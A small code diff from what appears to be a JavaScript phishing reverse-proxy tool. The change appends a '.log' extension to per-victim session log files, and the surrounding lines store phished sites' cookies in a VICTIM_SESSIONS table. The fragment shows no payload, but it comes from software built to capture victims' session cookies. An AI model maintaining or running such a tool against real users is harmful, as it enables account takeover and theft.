@@ -675,7 +675,7 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName] = {};
     VICTIM_SESSIONS[cookieName].value = cookieValue;
     VICTIM_SESSIONS[cookieName].cookies = [];
-    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
+    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}.log`;
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
 
     return {
